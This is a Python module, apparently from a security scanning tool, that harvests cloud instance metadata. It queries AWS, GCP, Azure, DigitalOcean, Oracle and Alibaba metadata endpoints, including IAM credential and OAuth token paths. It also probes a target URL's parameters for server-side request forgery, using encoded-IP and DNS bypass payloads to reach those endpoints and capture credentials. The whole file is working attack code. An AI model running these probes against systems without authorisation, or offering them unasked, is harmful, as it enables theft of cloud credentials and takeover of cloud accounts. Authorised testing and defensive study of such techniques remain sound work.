"""Cloud Metadata Harvester — AWS/GCP/Azure/DO/Oracle IMDS credential extraction."""

import aiohttp
import asyncio
from modules.core import console

CLOUD_TARGETS = {
    'AWS IMDSv1': {
        'base': 'http://169.254.169.254', 'headers': {},
        'paths': ['/latest/meta-data/', '/latest/meta-data/ami-id', '/latest/meta-data/iam/security-credentials/',
                  '/latest/meta-data/iam/info', '/latest/user-data', '/latest/dynamic/instance-identity/document'],
    },
    'GCP': {
        'base': 'http://metadata.google.internal', 'headers': {'Metadata-Flavor': 'Google'},
        'paths': ['/computeMetadata/v1/project/project-id', '/computeMetadata/v1/instance/',
                  '/computeMetadata/v1/instance/service-accounts/default/token',
                  '/computeMetadata/v1/instance/service-accounts/default/email'],
    },
    'Azure': {
        'base': 'http://169.254.169.254', 'headers': {'Metadata': 'true'},
        'paths': ['/metadata/instance?api-version=2021-02-01', '/metadata/instance/compute?api-version=2021-02-01',
                  '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'],
    },
    'DigitalOcean': {
        'base': 'http://169.254.169.254', 'headers': {},
        'paths': ['/metadata/v1/', '/metadata/v1/hostname', '/metadata/v1/id', '/metadata/v1/user-data'],
    },
    'Oracle': {
        'base': 'http://169.254.169.254', 'headers': {'Authorization': 'Bearer Oracle'},
        'paths': ['/opc/v2/instance/', '/opc/v2/instance/metadata/', '/opc/v2/identity/token'],
    },
    'Alibaba': {
        'base': 'http://100.100.100.200', 'headers': {},
        'paths': ['/latest/meta-data/', '/latest/meta-data/instance-id', '/latest/meta-data/ram/security-credentials/'],
    },
}

SSRF_PARAMS = ['url', 'uri', 'path', 'redirect', 'next', 'callback', 'file', 'load',
               'src', 'img', 'page', 'host', 'fetch', 'proxy', 'dest', 'target']


async def _direct_check(session, cloud_name, config):
    findings = []
    for path in config['paths']:
        try:
            async with session.get(config['base'] + path, headers=config.get('headers', {}),
                                   timeout=aiohttp.ClientTimeout(total=3), ssl=False) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    if len(body) > 5 and 'not found' not in body.lower():
                        findings.append({'type': f'{cloud_name} Metadata', 'path': path,
                                         'severity': 'Critical', 'data': body[:100]})
        except Exception:
            pass
    return findings


async def _ssrf_metadata(session, url):
    findings = []
    targets = [('AWS', 'http://169.254.169.254/latest/meta-data/'),
               ('GCP', 'http://metadata.google.internal/computeMetadata/v1/'),
               ('Azure', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01')]
    bypasses = ['{t}', 'http://[::ffff:169.254.169.254]/', 'http://0xA9FEA9FE/',
                'http://2852039166/', 'http://169.254.169.254.nip.io/']

    for param in SSRF_PARAMS[:8]:
        for cloud, target in targets:
            for bp in bypasses[:3]:
                try:
                    async with session.get(url, params={param: bp.replace('{t}', target)},
                                           timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                        body = await resp.text()
                        if any(i in body for i in ['ami-id', 'instance-id', 'project-id', 'security-credentials']):
                            findings.append({'type': f'SSRF→{cloud} Metadata', 'param': param,
                                             'severity': 'Critical', 'data': body[:80]})
                except Exception:
                    pass
    return findings


async def scan_cloud_metadata(session, url):
    console.print(f"\n[bold cyan]--- Cloud Metadata Harvester ---[/bold cyan]")
    all_findings = []

    console.print(f"  [cyan]Direct metadata (6 clouds)...[/cyan]")
    for name, cfg in CLOUD_TARGETS.items():
        r = await _direct_check(session, name, cfg)
        all_findings.extend(r)
        for f in r:
            console.print(f"  [bold red]⚠ {f['type']}: {f['path']}[/bold red]")

    console.print(f"  [cyan]SSRF to metadata (8 params × 3 clouds × 3 bypasses)...[/cyan]")
    ssrf = await _ssrf_metadata(session, url)
    all_findings.extend(ssrf)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} cloud exposures![/bold red]")
    else:
        console.print(f"\n  [green]✓ No cloud metadata accessible[/green]")
    return {'findings': all_findings}
